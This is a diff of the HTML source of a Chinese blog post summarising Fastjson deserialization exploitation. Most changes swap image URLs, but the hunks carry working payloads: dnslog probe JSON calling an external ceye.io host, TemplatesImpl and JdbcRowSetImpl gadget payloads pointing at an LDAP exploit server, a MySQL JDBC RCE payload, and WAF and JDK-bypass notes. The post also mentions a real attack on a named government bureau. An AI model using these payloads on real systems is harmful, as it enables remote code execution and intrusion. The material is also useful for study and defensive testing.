@@ -33,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/fastjson\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  7586 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  7566 ,
         "url": "https:\/\/songzhiv.github.io\/fastjson\/","datePublished": "2022-02-01T23:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -110,7 +110,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Fastjson利用总结</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7586 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7566 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 16 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -169,42 +169,48 @@
 <h2 id="探测fastjson">探测fastjson</h2>
 <p><strong>对于有错误回显的情况</strong></p>
 <p>使用<code>{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code>或者 <code>&quot;{&quot;a&quot;:x&quot;</code>通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了</p>
-<img src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png" title="" alt="image.png" data-align="center">
-<img src="https://s2.loli.net/2022/02/20/pEBv8NlifAXWRQ2.png" title="" alt="" data-align="center">
-<p><strong>无回显使用dnslog探测POC：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="mi">1</span><span class="err">.</span> <span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.net.InetSocketAddress&#34;</span><span class="p">{</span><span class="nt">&#34;address&#34;</span><span class="p">:,</span><span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;sq20yi.ceye.io&#34;</span><span class="p">}}</span>
-<span class="mi">2</span><span class="err">.</span> <span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.net.Inet4Address&#34;</span><span class="p">,</span><span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;sq20yi.ceye.io&#34;</span><span class="p">}</span>
-<span class="mi">3</span><span class="err">.</span> <span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.net.Inet6Address&#34;</span><span class="p">,</span><span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;sq20yi.ceye.io&#34;</span><span class="p">}</span>
-<span class="mi">4</span><span class="err">.</span> <span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.alibaba.fastjson.JSONObject&#34;</span><span class="p">,</span> <span class="err">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.net.URL&#34;</span><span class="p">,</span> <span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;http://sq20yi.ceye.io&#34;</span><span class="p">}</span><span class="err">}</span><span class="s2">&#34;&#34;</span><span class="err">}</span>
-<span class="mi">5</span><span class="err">.</span> <span class="err">Set</span><span class="p">[{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.net.URL&#34;</span><span class="p">,</span><span class="nt">&#34;val&#34;</span><span class="p">:</span><span class="s2">&#34;http://sq20yi.ceye.io&#34;</span><span class="p">}]</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>抓包修改请求体</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png"
-        data-srcset="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png, https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png 1.5x, https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png"
+        title="image.png" /></p>
+<p><strong>无回显使用dnslog探测POC：</strong></p>
+<ol>
+<li><code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}}</code></li>
+<li><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
+<li><code>{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
+<li><code>{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;}</code></li>
+<li><code>Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}</code></li>
+<li><code>{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0</code></li>
+</ol>
+<p>抓包修改请求体</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png"
         title="image.png" /></p>
 <p>==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png"
-        data-srcset="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png, https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png 1.5x, https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png"
         title="image.png" /></p>
 <h2 id="验证是否存在漏洞">验证是否存在漏洞</h2>
 <p>fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，</p>
@@ -250,10 +256,10 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png"
-        data-srcset="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png, https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png 1.5x, https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png"
         title="image.png" /></p>
 <p><strong>实战基本是直接拿47版本的payload打dnslog，dnslog有反应就继续，没反应再一步一步验证。 🙃效率高很多。</strong></p>
 <h2 id="绕过高版本jdk对jndi注入的限制">绕过高版本jdk对jndi注入的限制</h2>
@@ -272,21 +278,21 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png"
-        data-srcset="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png, https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png 1.5x, https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png"
         title="image.png" /></p>
 <p>高版本jdk的jndi注入（jdk1.8.212）：</p>
 <p>ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png"
-        data-srcset="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png, https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png 1.5x, https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png"
-        title="image-20220220011650815" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png"
+        title="image.png" /></p>
 <p>所以实战情况下遇到上述情况（<strong>ldap服务收到信息，却没有http请求</strong>）多半可以断定是采用高版本jdk。</p>
 <h3 id="绕过高版本jdk对jndi注入的限制-1"><strong>绕过高版本jdk对jndi注入的限制</strong></h3>
 <p>绕过原理参考：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener noreffer">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
@@ -298,7 +304,6 @@
 <p>GitHub上的轮子：<a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreffer">https://github.com/veracode-research/rogue-jndi</a></p>
 <p>以实战为例：深圳地质局的fastjson</p>
 <p>：<strong>见视频</strong> 😇</p>
-<p>视频有些敏感，不公开了。</p>
 <h2 id="fastjson不出网与命令回显">fastjson不出网与命令回显</h2>
 <blockquote>
 <p>注：此攻击手法同样适用于高版本jdk下的利用</p>
@@ -337,21 +342,21 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="mi">1</span><span class="err">.</span> <span class="err">基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>
 <span class="p">{</span>
-        <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
-        <span class="nt">&#34;_bytecodes&#34;</span><span class="p">:[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
-        <span class="err">&#39;_name&#39;:&#39;a.b&#39;,</span>
-        <span class="err">&#39;_tfactory&#39;:{</span> <span class="p">}</span><span class="err">,</span>
-        <span class="s2">&#34;_outputProperties&#34;</span><span class="err">:</span><span class="p">{}</span><span class="err">,</span>
-        <span class="s2">&#34;_name&#34;</span><span class="err">:</span><span class="s2">&#34;a&#34;</span><span class="err">,</span>
-        <span class="s2">&#34;_version&#34;</span><span class="err">:</span><span class="s2">&#34;1.0&#34;</span><span class="err">,</span>
-        <span class="s2">&#34;allowedProtocols&#34;</span><span class="err">:</span><span class="s2">&#34;all&#34;</span>
+		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
+		<span class="nt">&#34;_bytecodes&#34;</span><span class="p">:[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
+		<span class="err">&#39;_name&#39;:&#39;a.b&#39;,</span>
+		<span class="err">&#39;_tfactory&#39;:{</span> <span class="p">}</span><span class="err">,</span>
+		<span class="s2">&#34;_outputProperties&#34;</span><span class="err">:</span><span class="p">{}</span><span class="err">,</span>
+		<span class="s2">&#34;_name&#34;</span><span class="err">:</span><span class="s2">&#34;a&#34;</span><span class="err">,</span>
+		<span class="s2">&#34;_version&#34;</span><span class="err">:</span><span class="s2">&#34;1.0&#34;</span><span class="err">,</span>
+		<span class="s2">&#34;allowedProtocols&#34;</span><span class="err">:</span><span class="s2">&#34;all&#34;</span>
 <span class="err">}</span>
 <span class="mi">2</span><span class="err">.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）</span>
 
 <span class="p">{</span>
-        <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> 
-        <span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="p">,</span> 
-        <span class="nt">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span>
+		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> 
+		<span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="p">,</span> 
+		<span class="nt">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span>
 <span class="p">}</span>
 
 <span class="mi">3</span><span class="err">.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource</span>
@@ -487,10 +492,10 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png"
-        data-srcset="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png, https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png 1.5x, https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png"
         title="image.png" /></p>
 <h2 id="绕waf">绕waf</h2>
 <p>不同与传统json标准，在fastjson中16进制是可以被解析的。它还支持在json语句中加入注释，单引号替换双引号，默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等等等。</p>
@@ -500,34 +505,34 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png"
-        data-srcset="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png, https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png 1.5x, https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png"
         title="image.png" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png"
-        data-srcset="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png, https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png 1.5x, https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png"
         title="image.png" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png"
-        data-srcset="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png, https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png 1.5x, https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png"
         title="image.png" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png"
-        data-srcset="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png, https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png 1.5x, https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png"
         title="image.png" /></p>
 <h2 id="fastjson1268利用">fastjson1.2.68利用</h2>
 <p>和1.2.47版本的漏洞一样，68版本也是对checkAutoType()的的绕过，无需考虑fastjson的黑名单进行利用。</p>
@@ -541,10 +546,10 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png"
-        data-srcset="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png, https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png 1.5x, https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png"
         title="image.png" /></p>
 <h3 id="mysql-rce">Mysql RCE</h3>
 <p><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p>
@@ -603,9 +608,11 @@
 </span><span class="lnt">49
 </span><span class="lnt">50
 </span><span class="lnt">51
+</span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="m">5.1</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">SSRF</span><span class="p">)</span><span class="err">，</span><span class="m">5.1</span><span class="p">.</span><span class="m">11</span><span class="p">-</span><span class="m">5.1</span><span class="p">.</span><span class="m">48</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp">
+<span class="m">5.1</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">SSRF</span><span class="p">)</span><span class="err">，</span><span class="m">5.1</span><span class="p">.</span><span class="m">11</span><span class="p">-</span><span class="m">5.1</span><span class="p">.</span><span class="m">48</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
   <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;com.mysql.jdbc.JDBC4Connection&#34;</span><span class="p">,</span>
@@ -662,10 +669,10 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png"
-        data-srcset="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png, https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png 1.5x, https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png"
         title="image.png" /></p>
 <blockquote>
 <p><strong>以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接</strong></p>
@@ -965,20 +972,20 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png"
-        data-srcset="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png, https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png 1.5x, https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png 2x"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;display=inline&amp;height=529&amp;margin=%5Bobject%20Object%5D&amp;originHeight=529&amp;originWidth=982&amp;size=0&amp;status=done&amp;style=none&amp;width=982"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;display=inline&amp;height=529&amp;margin=%5Bobject%20Object%5D&amp;originHeight=529&amp;originWidth=982&amp;size=0&amp;status=done&amp;style=none&amp;width=982, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;display=inline&amp;height=529&amp;margin=%5Bobject%20Object%5D&amp;originHeight=529&amp;originWidth=982&amp;size=0&amp;status=done&amp;style=none&amp;width=982 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;display=inline&amp;height=529&amp;margin=%5Bobject%20Object%5D&amp;originHeight=529&amp;originWidth=982&amp;size=0&amp;status=done&amp;style=none&amp;width=982 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;display=inline&amp;height=529&amp;margin=%5Bobject%20Object%5D&amp;originHeight=529&amp;originWidth=982&amp;size=0&amp;status=done&amp;style=none&amp;width=982"
         title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;amp;display=inline&amp;amp;height=529&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=529&amp;amp;originWidth=982&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=982" /></p>
 <p>跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</p>
 <p>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png"
-        data-srcset="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png, https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png 1.5x, https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png 2x"
